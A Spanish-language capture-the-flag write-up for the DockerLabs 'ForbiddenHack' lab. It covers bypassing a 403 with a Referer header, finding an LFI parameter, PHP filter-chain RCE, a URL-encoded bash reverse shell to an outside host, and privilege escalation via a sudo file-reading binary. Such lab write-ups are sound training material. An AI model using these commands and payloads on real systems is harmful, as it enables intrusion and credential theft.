---
tags:
  - ctf
  - writeup
platform: DockerLabs
machine: ForbiddenHack
difficulty: Easy
os: Linux
status: Completada
---

# 🏴 DockerLabs — ForbiddenHack

## Resumen

Bypass código de estado 403 y explotación de LFI con Wrapper.

---

## Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p80 172.17.0.2
```

En este escaneo, vemos que se trata de un servidor web, sin FTP, sin SSH, sin nada que no sea el puerto 80. 

![Pasted image 20260818231608](../images/Pasted%20image%2020260818231608.png)

Decidí echar un vistazo a la web y era una Default Page de Apache, no veía nada interesante así que me puse a enumerar directorios pero no encontré nada. Así que volví a la página principal y leyendo el código fuente nos encontramos una pista:

![Pasted image 20260818231726](../images/Pasted%20image%2020260818231726.png)

Hacia referencia a `/var/www/bypass403.pw,` así que metí en mi archivo `/etc/hosts` la dirección IP de la máquina víctima y bypass403.pw.

![Pasted image 20260818231907](../images/Pasted%20image%2020260818231907.png)

---

## Enumeración

Al introducir el dominio, nos encontramos con un 403 Forbidden que nos impide el paso, probé enumeración de directorios y de archivos pero todo chocaba con el 403, así que tenía que saltármelo de alguna manera. Es cuando abrí Burpsuite, encendí el proxy, y me puse a ver como funcionaba esta petición al servidor.

Para hacer el bypass simplemente añadí una cabecera, `Referer: http://bypass403.pw/`, con esta el servidor piensa que mi solicitud está autorizada para acceder al recurso debido a una mala configuración.

<img src="../images/Pasted%20image%2020260818232448.png" width="217" alt="Pasted image 20260818232448" />

Y nos encontramos con esto:

![Pasted image 20260818232411](../images/Pasted%20image%2020260818232411.png)
Con esto hemos bypasseado el acceso, podiendo ver la página. Pero aún así, tampoco podía hacer mucho con esto, así que decidí buscar parámetros vulnerables para una LFI ya que teníamos la cabecera necesaria para saltarnos el 403.

```bash
ffuf -u "http://bypass403.pw/index.php?FUZZ=/etc/passwd" \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
     -H "Referer: http://bypass403.pw/" \
     -ac 
```

Con este comando, le indicamos que tiene que ir probando parámetros para poder leer el /etc/passwd, con una wordlist dada y la cabecera necesaria para saltarnos el 403, además, añadimos `-ac` para evitar falsos positivos.

![Pasted image 20260818232811](../images/Pasted%20image%2020260818232811.png)

Nos encontró el parámetro `pages`, con este parámetro podíamos ver archivos de la máquina:

![Pasted image 20260818225855](../images/Pasted%20image%2020260818225855.png)

Como podemos ver en la captura, usando la cabecera `Referer` y haciendo un GET a `/index.php?pages=/etc/passwd` podemos leer el contenido.
Pero, no podemos escribir nada, solo podemos leer de esta manera, así que decidí aplicar una herramienta de Github, [PHP_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator/tree/main) esta herramienta nos permite conseguir una RCE a través de los wrappers de PHP:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

![Pasted image 20260818233723](../images/Pasted%20image%2020260818233723.png)

Esta herramienta nos da una cadena enorme sobre la cadena de texto que le pasemos, esto funciona porque PHP permite utilizar wrappers como `php://filter`, que pueden aplicar filitros y transfromar el contenido ANTES de que sea procesado. Esta herramienta aprovecha eso usando distintas conversiones para que el resultado final sea el código PHP que le pasemos.

Una vez que tengo la cadena, la metí en Burpsuite después del parámetro vulnerable que encontramos, `pages`, y añadimos `cmd=id` al final, entonces el código PHP ejecuta: system("id");

<img src="../images/Pasted%20image%2020260818234228.png" width="481" alt="Pasted image 20260818234228" />

Con esto tenemos ya RCE en la máquina víctima.

---

## Acceso inicial (Foothold)

Una vez que tenemos RCE, necesitamos una manera para conseguir una reverse shell, al principió perdí mucho tiempo intentando enviar por una cadena de PHP una reverse shell entera, pero esto hace que la URI sea demasiado larga y Apache no lo procese, entonces una vez que tenía la opción de poner cmd=**comando que deseé** escribí una reverse shell en bash hacia mi IP y el puerto 2727, pero si la ponía normal no funcionaba, la tuve que codear en URL:

<img src="../images/Pasted%20image%2020260818230738.png" width="275" alt="Pasted image 20260818230738" />

Y añadí lo que me dió: `&cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F172.17.0.1%2F2727%20%3C%261%27`

Con esto puesto al final de la cadena gigante de PHP, nos lanza una reverse shell, me pongo en escucha con `nc -lvnp 2727` , le damos a enviar la petición y conseguimos lo que queríamos.

<img src="../images/Pasted%20image%2020260818234748.png" width="451" alt="Pasted image 20260818234748" />


---

## Escalada de Privilegios

Probé `sudo -l`, escalada por SUID, capabilities, pero no encontraba nada, así que recordé que había un usuario llamado `bambi`, fui a su home y tenía un directorio oculto llamado  .secret que contenía un fichero llamado interestingSecret.txt. El contenido del archivo era
`bambi:c3VwZXJzZWNyZXRwYXNzd29yZDEyMw`, pensé que era la contraseña del usuario pero después de intentarlo me di cuenta que no, así que la decodifiqué por base64 y me dió la password real que era `supersecretpassword123` 

<img src="../images/Pasted%20image%2020260818231014.png" width="562" alt="Pasted image 20260818231014" />

<img src="../images/Pasted%20image%2020260818231000.png" width="297" alt="Pasted image 20260818231000" />

Ya con el usuario de bambi, hice sudo -l y vi algo raro:
<img src="../images/Pasted%20image%2020260818235836.png" width="536" alt="Pasted image 20260818235836" />

Podía usar sudo en ese binario que no lo había visto antes, decidí ver de que se trataba y vi que tenía un par de módulos instalados pero poco más, la ayuda no daba mucha información. Así que decidí usar el comando `strings` para ver las cadenas de texto del binario, y encontré bastante información, con ella saqué que había una opción de poder leer un archivo con el parámetro `-r`. 

Intenté leer un archivo que normalmente no se puede leer que es el `/etc/shadow` y funcionaba
<img src="../images/Pasted%20image%2020260819000133.png" width="497" alt="Pasted image 20260819000133" />

Pero seguía sin tener mucho de donde tirar, así que decidí buscar si había algún archivo con el nombre del binario en el sistema con 

```bash
find / -iname "furb*" 2>/dev/null
```

Y había un archivo en `/var/backups/furbRead.txt` que ponía que este nombre de archivo era interesante, que donde más lo podía encontrar. Así que decidí buscar el archivo en /root/ ya que antes he buscado en todo el sistema, pero en root no puedo entrar. Así que con este comando:

```bash 
sudo furb -r /root/furbRead.txt
```

Y efectivamente existía y el contenido era StrongPasswordRootSuperSecret123
Probé como la contraseña del root y conseguí acceso root.

<img src="../images/Pasted%20image%2020260819000742.png" width="591" alt="Pasted image 20260819000742" />
